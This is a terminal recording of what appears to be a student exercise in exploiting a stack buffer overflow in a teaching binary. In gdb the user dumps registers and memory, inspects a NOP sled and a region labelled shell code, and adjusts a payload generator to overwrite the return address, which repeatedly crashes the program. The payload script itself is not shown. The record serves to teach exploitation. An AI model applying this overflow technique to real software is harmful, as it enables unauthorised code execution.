Script started on Thu 24 Oct 2019 03:37:59 AM EDT
]0;mark@wreckme: ~mark@wreckme:~$ exitgdb --args ex1 Mark Thompson testFile
GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.3) 7.7.1
Copyright (C) 2014 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ex1...done.
(gdb) c:[K[Kb ex1.c:27
Breakpoint 1 at 0x804878a: file ex1.c, line 27.
(gdb) b ex1.c:27[K9
Breakpoint 2 at 0x80487ab: file ex1.c, line 29.
(gdb) info reg
The program has no registers now.
(gdb) run
Starting program: /home/mark/ex1 Mark Thompson testFile
Numbers (m, n): 738 13
Provided name: Mark Thompson
Reading file into buffer at 0xbffff3a0

Breakpoint 1, f (n=738, m=13, str=0xbffff8c8 "testFile") at ex1.c:27
27		fread(buf, sizeof(buf[0]), pos, f);
(gdb) info reg
eax            0x0	0
ecx            0x804b0a0	134525088
edx            0x0	0
ebx            0xbffff680	-1073744256
esp            0xbffff390	0xbffff390
ebp            0xbffff6a8	0xbffff6a8
esi            0x0	0
edi            0x0	0
eip            0x804878a	0x804878a <f+253>
eflags         0x282	[ SF IF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) n

Breakpoint 2, f (n=738, m=13, str=0xbffff8c8 "testFile") at ex1.c:29
29		buf[m] = 0;
(gdb) info reg
eax            0x2f0	752
ecx            0x804b0a0	134525088
edx            0x2f0	752
ebx            0xbffff680	-1073744256
esp            0xbffff390	0xbffff390
ebp            0xbffff6a8	0xbffff6a8
esi            0x0	0
edi            0x0	0
eip            0x80487ab	0x80487ab <f+286>
eflags         0x282	[ SF IF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb) x [K/64 0xbffff390
0xbffff390:	-1073744992	1	752	134524936
0xbffff3a0:	1802658125	1869108256	1869836397	-1869574034
0xbffff3b0:	-1869574000	-1869574000	-1869574000	-1869574000
0xbffff3c0:	-1869574000	-1869574000	-1869574000	-1869574000
0xbffff3d0:	-1869574000	-1869574000	-1869574000	-1869574000
0xbffff3e0:	-1869574000	-1869574000	-1869574000	-1869574000
0xbffff3f0:	-1869574000	-1869574000	-1869574000	-1869574000
0xbffff400:	-1869574000	-1869574000	-1869574000	-1869574000
0xbffff410:	-1869574000	-1869574000	-1869574000	-1869574000
0xbffff420:	-1869574000	-1869574000	-1869574000	-1869574000
0xbffff430:	-1869574000	-1869574000	-1869574000	-1869574000
0xbffff440:	-1869574000	-1869574000	-1869574000	-1869574000
0xbffff450:	-1869574000	-1869574000	-1869574000	-1869574000
0xbffff460:	-1869574000	-1869574000	-1869574000	-1869574000
0xbffff470:	-1869574000	-1869574000	-1869574000	-1869574000
0xbffff480:	-1869574000	-1869574000	-1869574000	-1869574000
(gdb) x/64 0xbffff390[1P 0xbffff390
[C[C[C[C[C[C[C[C[C[1P 0xbffff390
[C[C[C[C[C[C[C[C[1P 0xbffff390
[C[C[C[C[C[C[C
0xbffff390:	0xbffff3a0
(gdb) x 0xbffff390
[C[C[C[C[C[C[C/64 0xbffff390
0xbffff390:	0xbffff3a0	0x00000001	0x000002f0	0x0804b008
0xbffff3a0:	0x6b72614d	0x6f685420	0x6f73706d	0x9090906e
0xbffff3b0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff3c0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff3d0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff3e0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff3f0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff400:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff410:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff420:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff430:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff440:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff450:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff460:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff470:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff480:	0x90909090	0x90909090	0x90909090	0x90909090
(gdb) 
0xbffff490:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff4a0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff4b0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff4c0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff4d0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff4e0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff4f0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff500:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff510:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff520:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff530:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff540:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff550:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff560:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff570:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff580:	0x90909090	0x90909090	0x90909090	0x90909090
(gdb) 
0xbffff590:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff5a0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff5b0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff5c0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff5d0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff5e0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff5f0:	0x30633133	0x62623834	0x64393164	0x31393639
0xbffff600:	0x63383064	0x66663739	0x37663834	0x33356264
0xbffff610:	0x66353435	0x32353939	0x34353735	0x30626535
0xbffff620:	0x66306233	0x90903530	0x90909090	0x90909090
0xbffff630:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff640:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff650:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff660:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff670:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff680:	0x90909090	0x90909090	0x90909090	0xbffff5f0
(gdb) 
0xbffff690:	0xbffff3a0	0x000002e1	0x0804b008	0x000002f0
0xbffff6a0:	0xb7fcdac0	0x00000004	0xbffff6d8	0x0804898a
0xbffff6b0:	0x000002e2	0x0000000d	0xbffff8c8	0xbffff8bf
0xbffff6c0:	0xb7fcd3c4	0xb7fff000	0x0000000d	0x000002e2
0xbffff6d0:	0x080489a0	0xb7fcd000	0x00000000	0xb7e39af3
0xbffff6e0:	0x00000004	0xbffff774	0xbffff788	0xb7fece6a
0xbffff6f0:	0x00000004	0xbffff774	0xbffff714	0x0804a030
0xbffff700:	0x080482f8	0xb7fcd000	0x00000000	0x00000000
0xbffff710:	0x00000000	0x646b5b0f	0x5cb3ff1f	0x00000000
0xbffff720:	0x00000000	0x00000000	0x00000004	0x08048590
0xbffff730:	0x00000000	0xb7ff2660	0xb7e39a09	0xb7fff000
0xbffff740:	0x00000004	0x08048590	0x00000000	0x080485b1
0xbffff750:	0x0804882f	0x00000004	0xbffff774	0x080489a0
0xbffff760:	0x08048a10	0xb7fed300	0xbffff76c	0x0000001c
0xbffff770:	0x00000004	0xbffff8ab	0xbffff8ba	0xbffff8bf
0xbffff780:	0xbffff8c8	0x00000000	0xbffff8d1	0xbffff8e2
(gdb) q
A debugging session is active.

	Inferior 1 [process 11955] will be killed.

Quit anyway? (y or n) y
]0;mark@wreckme: ~mark@wreckme:~$ pythone3 [K[K[K[K [Kn3 toBin.py & [K& ./ex1 Mark Thompson testFile 
Numbers (m, n): 738 13
Provided name: Mark Thompson
Reading file into buffer at 0xbffff3d0
Your name is: Mark Thompson
First 32 hex values read from file (A=0x41, a=0x61):
	0x4d 0x61 0x72 0x6b 0x20 0x54 0x68 0x6f 0x6d 0x70 0x73 0x6f 0x6e 0x00 0x90 0x90 
	0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 
This message should not be printed
]0;mark@wreckme: ~mark@wreckme:~$ echo "Now I'm updating the ar[K[Kamount of chrac[K[K[Karacters after the shell code, which starts at 0xbffff5f0"
Now I'm updating the amount of characters after the shell code, which starts at 0xbffff5f0
]0;mark@wreckme: ~mark@wreckme:~$ echo "Now I'm updating the amount of characters after the shell code, which starts at 0xbffff5f0"
[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[48Ppython3 toBin.py && ./ex1 Mark Thompson testFile 
Numbers (m, n): 738 13
Provided name: Mark Thompson
Reading file into buffer at 0xbffff3d0
Your name is: êêêêêêêêêêêêê
First 32 hex values read from file (A=0x41, a=0x61):
	0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x00 0x90 0x90 
	0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 0x90 
This message should not be printed
]0;mark@wreckme: ~mark@wreckme:~$ python3 toBin.py && ./ex1 Mark Thompson testFile 
Numbers (m, n): 738 13
Provided name: Mark Thompson
Reading file into buffer at 0xbffff3d0
Segmentation fault (core dumped)
]0;mark@wreckme: ~mark@wreckme:~$ gpython3 toBin.py && ./ex1 Mark Thompson testFile 
[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cecho "Now I'm updating the amount of characters after the shell code, which starts at 0xbffff5f0"
[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[48Ppython3 toBin.py && ./ex1 Mark Thompson testFile 
[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[12Pgdb --args ex1 Mark Thompson testFile
[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cexit[Kgdb --args ex1 Mark Thompson testFile
[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[Cpython3 toBin.py && ./ex1 Mark Thompson testFile 
[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[12Pgdb --args ex1 Mark Thompson testFile
GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.3) 7.7.1
Copyright (C) 2014 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from ex1...done.
(gdb) disas
No frame selected.
(gdb) i[Kdisas main
Dump of assembler code for function main:
   0x0804882f <+0>:	push   %ebp
   0x08048830 <+1>:	mov    %esp,%ebp
   0x08048832 <+3>:	push   %ebx
   0x08048833 <+4>:	and    $0xfffffff0,%esp
   0x08048836 <+7>:	sub    $0x20,%esp
   0x08048839 <+10>:	cmpl   $0x4,0x8(%ebp)
   0x0804883d <+14>:	je     0x8048870 <main+65>
   0x0804883f <+16>:	mov    0x804a060,%eax
   0x08048844 <+21>:	mov    %eax,0xc(%esp)
   0x08048848 <+25>:	movl   $0x29,0x8(%esp)
   0x08048850 <+33>:	movl   $0x1,0x4(%esp)
   0x08048858 <+41>:	movl   $0x8048ad4,(%esp)
   0x0804885f <+48>:	call   0x80484e0 <fwrite@plt>
   0x08048864 <+53>:	movl   $0x1,(%esp)
   0x0804886b <+60>:	call   0x8048520 <exit@plt>
   0x08048870 <+65>:	mov    0xc(%ebp),%eax
   0x08048873 <+68>:	add    $0x4,%eax
   0x08048876 <+71>:	mov    (%eax),%eax
   0x08048878 <+73>:	movzbl (%eax),%eax
   0x0804887b <+76>:	movsbl %al,%eax
   0x0804887e <+79>:	lea    -0x40(%eax),%edx
   0x08048881 <+82>:	mov    %edx,%eax
   0x08048883 <+84>:	shl    $0x2,%eax
   0x08048886 <+87>:	add    %edx,%eax
   0x08048888 <+89>:	add    %eax,%eax
   0x0804888a <+91>:	mov    %eax,%edx
   0x0804888c <+93>:	mov    0xc(%ebp),%eax
   0x0804888f <+96>:	add    $0x8,%eax
   0x08048892 <+99>:	mov    (%eax),%eax
   0x08048894 <+101>:	movzbl (%eax),%eax
   0x08048897 <+104>:	movsbl %al,%eax
   0x0804889a <+107>:	sub    $0x40,%eax
   0x0804889d <+110>:	add    %edx,%eax
   0x0804889f <+112>:	mov    %eax,0x1c(%esp)
   0x080488a3 <+116>:	cmpl   $0x0,0x1c(%esp)
   0x080488a8 <+121>:	jns    0x80488ae <main+127>
   0x080488aa <+123>:	negl   0x1c(%esp)
   0x080488ae <+127>:	mov    0xc(%ebp),%eax
   0x080488b1 <+130>:	add    $0x4,%eax
   0x080488b4 <+133>:	mov    (%eax),%eax
   0x080488b6 <+135>:	mov    %eax,(%esp)
   0x080488b9 <+138>:	call   0x8048530 <strlen@plt>
   0x080488be <+143>:	mov    %eax,%ebx
   0x080488c0 <+145>:	mov    0xc(%ebp),%eax
   0x080488c3 <+148>:	add    $0x8,%eax
   0x080488c6 <+151>:	mov    (%eax),%eax
   0x080488c8 <+153>:	mov    %eax,(%esp)
   0x080488cb <+156>:	call   0x8048530 <strlen@plt>
   0x080488d0 <+161>:	add    %ebx,%eax
---Type <return> to continue, or q <return> to quit---
   0x080488d2 <+163>:	add    $0x1,%eax
   0x080488d5 <+166>:	mov    %eax,0x18(%esp)
   0x080488d9 <+170>:	mov    0x18(%esp),%eax
   0x080488dd <+174>:	add    $0x1,%eax
   0x080488e0 <+177>:	imul   $0x2a,%eax,%eax
   0x080488e3 <+180>:	cmp    0x1c(%esp),%eax
   0x080488e7 <+184>:	jle    0x80488f7 <main+200>
   0x080488e9 <+186>:	mov    0x18(%esp),%eax
   0x080488ed <+190>:	add    $0x1,%eax
   0x080488f0 <+193>:	imul   $0x2a,%eax,%eax
   0x080488f3 <+196>:	add    %eax,0x1c(%esp)
   0x080488f7 <+200>:	cmpl   $0x400,0x1c(%esp)
   0x080488ff <+208>:	jle    0x8048909 <main+218>
   0x08048901 <+210>:	movl   $0x400,0x1c(%esp)
   0x08048909 <+218>:	cmpl   $0x32,0x18(%esp)
   0x0804890e <+223>:	jle    0x8048918 <main+233>
   0x08048910 <+225>:	movl   $0x32,0x18(%esp)
   0x08048918 <+233>:	mov    0x804a080,%eax
   0x0804891d <+238>:	mov    0x18(%esp),%edx
   0x08048921 <+242>:	mov    %edx,0xc(%esp)
   0x08048925 <+246>:	mov    0x1c(%esp),%edx
   0x08048929 <+250>:	mov    %edx,0x8(%esp)
   0x0804892d <+254>:	movl   $0x8048afe,0x4(%esp)
   0x08048935 <+262>:	mov    %eax,(%esp)
   0x08048938 <+265>:	call   0x8048550 <fprintf@plt>
   0x0804893d <+270>:	mov    0xc(%ebp),%eax
   0x08048940 <+273>:	add    $0x8,%eax
   0x08048943 <+276>:	mov    (%eax),%ecx
   0x08048945 <+278>:	mov    0xc(%ebp),%eax
   0x08048948 <+281>:	add    $0x4,%eax
   0x0804894b <+284>:	mov    (%eax),%edx
   0x0804894d <+286>:	mov    0x804a080,%eax
   0x08048952 <+291>:	mov    %ecx,0xc(%esp)
   0x08048956 <+295>:	mov    %edx,0x8(%esp)
   0x0804895a <+299>:	movl   $0x8048b15,0x4(%esp)
   0x08048962 <+307>:	mov    %eax,(%esp)
   0x08048965 <+310>:	call   0x8048550 <fprintf@plt>
   0x0804896a <+315>:	mov    0xc(%ebp),%eax
   0x0804896d <+318>:	add    $0xc,%eax
   0x08048970 <+321>:	mov    (%eax),%eax
   0x08048972 <+323>:	mov    %eax,0x8(%esp)
   0x08048976 <+327>:	mov    0x18(%esp),%eax
   0x0804897a <+331>:	mov    %eax,0x4(%esp)
   0x0804897e <+335>:	mov    0x1c(%esp),%eax
   0x08048982 <+339>:	mov    %eax,(%esp)
   0x08048985 <+342>:	call   0x804868d <f>
   0x0804898a <+347>:	movl   $0x8048b2c,(%esp)
   0x08048991 <+354>:	call   0x8048500 <puts@plt>
   0x08048996 <+359>:	mov    $0x0,%eax
   0x0804899b <+364>:	mov    -0x4(%ebp),%ebx
---Type <return> to continue, or q <return> to quit---
   0x0804899e <+367>:	leave  
   0x0804899f <+368>:	ret    
End of assembler dump.
(gdb) b *0x08048985
Breakpoint 1 at 0x8048985: file ex1.c, line 58.
(gdb) run 
Starting program: /home/mark/ex1 Mark Thompson testFile
Numbers (m, n): 738 13
Provided name: Mark Thompson

Breakpoint 1, 0x08048985 in main (argc=4, argv=0xbffff774) at ex1.c:58
58		f(m, n, argv[3]);
(gdb) x/128xb $esp
0xbffff6b0:	0xe2	0x02	0x00	0x00	0x0d	0x00	0x00	0x00
0xbffff6b8:	0xc8	0xf8	0xff	0xbf	0xbf	0xf8	0xff	0xbf
0xbffff6c0:	0xc4	0xd3	0xfc	0xb7	0x00	0xf0	0xff	0xb7
0xbffff6c8:	0x0d	0x00	0x00	0x00	0xe2	0x02	0x00	0x00
0xbffff6d0:	0xa0	0x89	0x04	0x08	0x00	0xd0	0xfc	0xb7
0xbffff6d8:	0x00	0x00	0x00	0x00	0xf3	0x9a	0xe3	0xb7
0xbffff6e0:	0x04	0x00	0x00	0x00	0x74	0xf7	0xff	0xbf
0xbffff6e8:	0x88	0xf7	0xff	0xbf	0x6a	0xce	0xfe	0xb7
0xbffff6f0:	0x04	0x00	0x00	0x00	0x74	0xf7	0xff	0xbf
0xbffff6f8:	0x14	0xf7	0xff	0xbf	0x30	0xa0	0x04	0x08
0xbffff700:	0xf8	0x82	0x04	0x08	0x00	0xd0	0xfc	0xb7
0xbffff708:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0xbffff710:	0x00	0x00	0x00	0x00	0xc2	0x3f	0xc0	0x86
0xbffff718:	0xd2	0x9b	0x18	0xbe	0x00	0x00	0x00	0x00
0xbffff720:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0xbffff728:	0x04	0x00	0x00	0x00	0x90	0x85	0x04	0x08
(gdb) x/128xb $esp[1P $espw $esp
0xbffff6b0:	0x000002e2	0x0000000d	0xbffff8c8	0xbffff8bf
0xbffff6c0:	0xb7fcd3c4	0xb7fff000	0x0000000d	0x000002e2
0xbffff6d0:	0x080489a0	0xb7fcd000	0x00000000	0xb7e39af3
0xbffff6e0:	0x00000004	0xbffff774	0xbffff788	0xb7fece6a
0xbffff6f0:	0x00000004	0xbffff774	0xbffff714	0x0804a030
0xbffff700:	0x080482f8	0xb7fcd000	0x00000000	0x00000000
0xbffff710:	0x00000000	0x86c03fc2	0xbe189bd2	0x00000000
0xbffff720:	0x00000000	0x00000000	0x00000004	0x08048590
0xbffff730:	0x00000000	0xb7ff2660	0xb7e39a09	0xb7fff000
0xbffff740:	0x00000004	0x08048590	0x00000000	0x080485b1
0xbffff750:	0x0804882f	0x00000004	0xbffff774	0x080489a0
0xbffff760:	0x08048a10	0xb7fed300	0xbffff76c	0x0000001c
0xbffff770:	0x00000004	0xbffff8ab	0xbffff8ba	0xbffff8bf
0xbffff780:	0xbffff8c8	0x00000000	0xbffff8d1	0xbffff8e2
0xbffff790:	0xbffff8f6	0xbffff906	0xbffff928	0xbffff93b
0xbffff7a0:	0xbffff945	0xbffffe66	0xbffffe72	0xbffffe86
0xbffff7b0:	0xbffffee4	0xbffffef3	0xbfffff02	0xbfffff13
0xbffff7c0:	0xbfffff1c	0xbfffff24	0xbfffff34	0xbfffff41
0xbffff7d0:	0xbfffff77	0xbfffff8c	0xbfffffac	0xbfffffcb
0xbffff7e0:	0x00000000	0x00000020	0xb7fdccf0	0x00000021
0xbffff7f0:	0xb7fdc000	0x00000010	0x0fabfbff	0x00000006
0xbffff800:	0x00001000	0x00000011	0x00000064	0x00000003
0xbffff810:	0x08048034	0x00000004	0x00000020	0x00000005
0xbffff820:	0x00000009	0x00000007	0xb7fde000	0x00000008
0xbffff830:	0x00000000	0x00000009	0x08048590	0x0000000b
0xbffff840:	0x000003e8	0x0000000c	0x000003e8	0x0000000d
0xbffff850:	0x000003e8	0x0000000e	0x000003e8	0x00000017
0xbffff860:	0x00000000	0x00000019	0xbffff88b	0x0000001f
0xbffff870:	0xbfffffed	0x0000000f	0xbffff89b	0x00000000
0xbffff880:	0x00000000	0x00000000	0x45000000	0xfff6872f
0xbffff890:	0xa95ebc96	0x9678ec82	0x692ce566	0x00363836
0xbffff8a0:	0x00000000	0x00000000	0x2f000000	0x656d6f68
(gdb) x/128xw $esp[K[Kbp
0xbffff6d8:	0x00000000	0xb7e39af3	0x00000004	0xbffff774
0xbffff6e8:	0xbffff788	0xb7fece6a	0x00000004	0xbffff774
0xbffff6f8:	0xbffff714	0x0804a030	0x080482f8	0xb7fcd000
0xbffff708:	0x00000000	0x00000000	0x00000000	0x86c03fc2
0xbffff718:	0xbe189bd2	0x00000000	0x00000000	0x00000000
0xbffff728:	0x00000004	0x08048590	0x00000000	0xb7ff2660
0xbffff738:	0xb7e39a09	0xb7fff000	0x00000004	0x08048590
0xbffff748:	0x00000000	0x080485b1	0x0804882f	0x00000004
0xbffff758:	0xbffff774	0x080489a0	0x08048a10	0xb7fed300
0xbffff768:	0xbffff76c	0x0000001c	0x00000004	0xbffff8ab
0xbffff778:	0xbffff8ba	0xbffff8bf	0xbffff8c8	0x00000000
0xbffff788:	0xbffff8d1	0xbffff8e2	0xbffff8f6	0xbffff906
0xbffff798:	0xbffff928	0xbffff93b	0xbffff945	0xbffffe66
0xbffff7a8:	0xbffffe72	0xbffffe86	0xbffffee4	0xbffffef3
0xbffff7b8:	0xbfffff02	0xbfffff13	0xbfffff1c	0xbfffff24
0xbffff7c8:	0xbfffff34	0xbfffff41	0xbfffff77	0xbfffff8c
0xbffff7d8:	0xbfffffac	0xbfffffcb	0x00000000	0x00000020
0xbffff7e8:	0xb7fdccf0	0x00000021	0xb7fdc000	0x00000010
0xbffff7f8:	0x0fabfbff	0x00000006	0x00001000	0x00000011
0xbffff808:	0x00000064	0x00000003	0x08048034	0x00000004
0xbffff818:	0x00000020	0x00000005	0x00000009	0x00000007
0xbffff828:	0xb7fde000	0x00000008	0x00000000	0x00000009
0xbffff838:	0x08048590	0x0000000b	0x000003e8	0x0000000c
0xbffff848:	0x000003e8	0x0000000d	0x000003e8	0x0000000e
0xbffff858:	0x000003e8	0x00000017	0x00000000	0x00000019
0xbffff868:	0xbffff88b	0x0000001f	0xbfffffed	0x0000000f
0xbffff878:	0xbffff89b	0x00000000	0x00000000	0x00000000
0xbffff888:	0x45000000	0xfff6872f	0xa95ebc96	0x9678ec82
0xbffff898:	0x692ce566	0x00363836	0x00000000	0x00000000
0xbffff8a8:	0x2f000000	0x656d6f68	0x72616d2f	0x78652f6b
0xbffff8b8:	0x614d0031	0x54006b72	0x706d6f68	0x006e6f73
0xbffff8c8:	0x74736574	0x656c6946	0x47445800	0x5345535f
(gdb) x/128xw $ebp[K[K[K[K0xbffff3a0
0xbffff3a0:	0xb7e23ea4	0x00000001	0xb7fd8470	0xb7fe7694
0xbffff3b0:	0xb7fdc57c	0xb7ff73fc	0x00000014	0xb7fff000
0xbffff3c0:	0xb7fd8470	0x00000003	0xbffff3f8	0x03e4b784
0xbffff3d0:	0x7c96f087	0xb7e23ed4	0xb7e2d3b4	0xb7ff3708
0xbffff3e0:	0xb7fff000	0x00000000	0x00000000	0xb7ff3833
0xbffff3f0:	0x00000008	0x0000001c	0x00000000	0x00000000
0xbffff400:	0x00000001	0x0000094e	0xb7fd8770	0xb7fd81b0
0xbffff410:	0xb7fde5f9	0xb7e2d474	0xb7fde33c	0x00000001
0xbffff420:	0x00000001	0xb7fff55c	0x00000000	0xb7fff000
0xbffff430:	0xbffff574	0xb7fffaf0	0xbffff4f8	0xb7fe791a
0xbffff440:	0xbffff4a8	0xb7fde33c	0xbffff4b0	0xb7fffa94
0xbffff450:	0x00000000	0xb7fd8770	0x00000001	0x00000000
0xbffff460:	0x00000001	0xb7fff55c	0x00000000	0xb7ff3708
0xbffff470:	0xb7fff000	0x00000007	0x00000070	0xb7ff3833
0xbffff480:	0x00000008	0x00000000	0xbffff574	0xbffff4b0
0xbffff490:	0xbffff4a8	0xb7fde5f9	0xb7fff55c	0x00000000
0xbffff4a0:	0x00000070	0xb7fe6f3d	0xb7e33061	0x08048392
0xbffff4b0:	0xb7e2d3b4	0xb7fd81b0	0x00000000	0xb7fee4a8
0xbffff4c0:	0x00000007	0x00000002	0x080482f9	0xb7fffc24
0xbffff4d0:	0x00000001	0xb7fff000	0xb7e2367c	0x00000001
0xbffff4e0:	0xb7fd8470	0xb7fe7694	0x00000001	0xb7fe8cfc
0xbffff4f0:	0xb7fff000	0x00000000	0xb7fd8470	0x00000003
0xbffff500:	0xbffff530	0x05e7ffc9	0xbcfff93e	0xb7e23ed4
0xbffff510:	0xb7e2b314	0xb7ff778c	0x00000000	0x00000000
0xbffff520:	0xb7fff55c	0xbffff588	0xbffff5a8	0x00000000
0xbffff530:	0x00000000	0x00000000	0x00000001	0x00000744
0xbffff540:	0xb7fd84a0	0xb7fd81b0	0x0804835f	0xb7e2d474
0xbffff550:	0x08048288	0x00000001	0x00000000	0xb7fde000
0xbffff560:	0x00000040	0xb7fff000	0xbffff674	0xb7fffaf0
0xbffff570:	0xbffff630	0xb7fe791a	0xbffff5e0	0x08048288
0xbffff580:	0xbffff5e8	0xb7fffa94	0x00000000	0xb7fd84a0
0xbffff590:	0x00000001	0x00000000	0x00000001	0xb7fff938
(gdb) n
Reading file into buffer at 0xbffff3a0

Program received signal SIGSEGV, Segmentation fault.
0x080487b3 in f (n=738, m=13, str=0xbffff8c8 "testFile") at ex1.c:29
29		buf[m] = 0;
(gdb) nx/128xw 0xbffff3a0[6P$ebpspb[C[C[C[C[Cw[C[C[C[C[Cbp0xbffff3a0
0xbffff3a0:	0x6b72614d	0x6f685420	0x6f73706d	0x9090906e
0xbffff3b0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff3c0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff3d0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff3e0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff3f0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff400:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff410:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff420:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff430:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff440:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff450:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff460:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff470:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff480:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff490:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff4a0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff4b0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff4c0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff4d0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff4e0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff4f0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff500:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff510:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff520:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff530:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff540:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff550:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff560:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff570:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff580:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff590:	0x90909090	0x90909090	0x90909090	0x90909090
(gdb) 
0xbffff5a0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff5b0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff5c0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff5d0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff5e0:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff5f0:	0x30633133	0x62623834	0x64393164	0x31393639
0xbffff600:	0x63383064	0x66663739	0x37663834	0x33356264
0xbffff610:	0x66353435	0x32353939	0x34353735	0x30626535
0xbffff620:	0x66306233	0x90903530	0x90909090	0x90909090
0xbffff630:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff640:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff650:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff660:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff670:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff680:	0x90909090	0x90909090	0x90909090	0x90909090
0xbffff690:	0xbbbbbbbb	0x000002e1	0x0804b008	0x000002f4
